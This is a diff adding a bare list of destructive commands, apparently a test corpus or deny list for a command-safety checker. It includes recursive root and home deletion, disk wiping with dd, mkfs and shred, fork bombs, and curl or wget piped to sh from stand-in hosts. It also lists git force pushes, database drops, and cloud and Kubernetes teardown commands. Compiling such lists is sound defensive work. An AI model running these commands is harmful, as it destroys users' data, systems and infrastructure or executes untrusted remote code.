@@ -1,0 +1,85 @@
+chmod -R 600 .*
+chown -R user:user .*
+rm -rf .*
+rm -rf "$STEAMROOT/"*
+rm -rf "$STEAMROOT"/*
+rm -rf /usr /lib/nvidia-current/xorg/xorg
+rm -rf "$var/"
+rm -rf "$dir"/*
+rm -rf /usr /lib
+rm -rf /
+rm -rf /*
+rm -rf --no-preserve-root /
+sudo rm -rf /
+sudo rm -rf /*
+rm -rf ~
+rm -rf ~/
+rm -rf $HOME
+rm -rf *
+rm -rf ./*
+rm -rf . 
+rm -rf /etc
+rm -rf /usr/lib
+rm -rf /home
+rm -rf /var/opt/gitlab/postgresql/data
+rm -rf /var/opt/gitlab/postgresql/data/*
+/bin/rm -rf /
+command rm -rf /
+\rm -rf /
+find / -delete
+find . -name '*.log' -exec rm -rf {} \;
+find / -type f | xargs rm -f
+chmod -R 777 /
+chmod -R 000 /
+chown -R user:user /
+chmod -x /bin/chmod
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/random of=/dev/sda
+dd if=something of=/dev/sda
+mkfs.ext3 /dev/sda
+mkfs.ext4 /dev/sda1
+shred -n 5 -vz /dev/sda
+wipefs -a /dev/sda
+> /dev/sda
+command > /dev/sda
+> /etc/passwd
+mv folder /dev/null
+mv ~ /dev/null
+:(){ :|:& };:
+:(){ :|: & };:
+bomb() { bomb | bomb & }; bomb
+perl -e "fork while fork"
+wget http://example/malicious.sh -O- | sh
+curl -fsSL http://example/install.sh | sh
+curl -s http://example/x.sh | sudo bash
+python -c "import shutil; shutil.rmtree('/')"
+bash -c "rm -rf /"
+sh -c 'rm -rf ~'
+node -e "require('fs').rmSync('/', {recursive:true})"
+git reset --hard
+git clean -fdx
+git clean -f
+git push --force
+git push -f origin main
+git checkout -- .
+git branch -D main
+git stash clear
+git restore .
+crontab -r
+DROP DATABASE production;
+DROP TABLE users;
+TRUNCATE TABLE users;
+DELETE FROM users;
+UPDATE users SET admin = true;
+psql -c "DROP DATABASE prod"
+mysql -e "DROP DATABASE prod"
+redis-cli FLUSHALL
+redis-cli FLUSHDB
+mongosh --eval "db.dropDatabase()"
+kubectl delete namespace production
+kubectl delete pods --all -A
+docker system prune -a --volumes
+docker rm -f $(docker ps -aq)
+terraform destroy -auto-approve
+aws s3 rm s3://bucket --recursive
+aws s3 rb s3://bucket --force
